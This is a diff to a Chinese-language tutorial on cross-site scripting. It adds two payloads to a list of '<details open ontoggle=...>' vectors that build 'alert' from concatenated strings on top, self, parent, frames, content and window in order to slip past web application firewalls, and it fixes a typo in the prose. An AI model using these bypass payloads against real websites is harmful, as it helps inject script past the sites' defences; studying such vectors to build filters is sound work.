@@ -33,12 +33,15 @@
 
 我们可以利用的类似拼接的对象又多了几个，例如：
 ```
+//一家人就是要整整齐齐
+<details open ontoggle=top['al'%2B'ert'](1) >
 <details open ontoggle=self['al'%2B'ert'](1) >
 <details open ontoggle=parent['al'%2B'ert'](1) >
 <details open ontoggle=frames['al'%2B'ert'](1) >
 <details open ontoggle=content['al'%2B'ert'](1) >
+<details open ontoggle=window['al'%2B'ert'](1) >
 ```
-这些都可以绕过waf，总结起来有 `top` `self` `parent` `frames` `content` `windiow`，无疑`top`是最短的，所谓短小精悍，这里借用PKAV的一张ppt。
+这些都可以绕过waf，总结起来有 `top` `self` `parent` `frames` `content` `window`，无疑`top`是最短的，所谓短小精悍，这里借用PKAV的一张ppt。
 
 ![7](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xkryc227j30fp073782.jpg)
 
